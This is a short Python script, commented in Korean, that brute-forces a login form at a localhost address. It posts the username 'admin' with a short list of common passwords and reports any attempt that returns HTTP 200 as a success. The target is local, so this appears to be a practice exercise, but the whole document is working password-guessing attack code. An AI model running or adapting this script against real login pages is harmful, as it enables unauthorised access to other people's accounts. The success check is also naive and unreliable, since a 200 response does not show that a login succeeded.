import requests

# 대상 URL 설정
url = "http://localhost:5000/login"

# 시도할 비밀번호 목록
passwords = ["123", "password", "admin", "1234", "letmein"]

# brute-force로 로그인 시도
for password in passwords:
    # POST 요청에 데이터 추가
    data = {
        "username": "admin",
        "password": password
    }
    
    # 요청 보내기
    response = requests.post(url, data=data)
    
    # 응답 확인
    if response.status_code == 200:
        print(f"[SUCCESS] Password found: {password}")
        break
    else:
        print(f"[FAILED] Tried password: {password}")
